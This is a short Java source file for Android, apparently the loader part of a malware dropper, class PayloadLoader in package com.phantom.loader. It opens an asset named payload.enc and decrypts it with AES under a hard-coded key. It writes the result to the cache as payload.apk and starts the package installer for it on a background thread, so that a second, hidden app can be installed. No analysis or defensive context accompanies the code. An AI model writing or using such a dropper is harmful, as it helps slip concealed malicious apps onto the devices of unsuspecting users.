package com.phantom.loader;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import java.io.*;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class PayloadLoader {
    private static final String KEY = "S3cr3tK3yPh4nt0m2025!@#";
    private final Context ctx;

    public PayloadLoader(Context ctx) { this.ctx = ctx; }

    public void load() {
        new Thread(() -> {
            try {
                InputStream is = ctx.getAssets().open("payload.enc");
                byte[] enc = new byte[is.available()];
                is.read(enc);
                is.close();

                MessageDigest sha = MessageDigest.getInstance("SHA-256");
                byte[] key = sha.digest(KEY.getBytes());
                SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, keySpec);
                byte[] dec = cipher.doFinal(enc);

                File outFile = new File(ctx.getCacheDir(), "payload.apk");
                FileOutputStream fos = new FileOutputStream(outFile);
                fos.write(dec);
                fos.close();

                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(outFile), "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                ctx.startActivity(intent);

            } catch (Exception e) { Log.e("Phantom", "Erro: " + e.getMessage()); }
        }).start();
    }
}
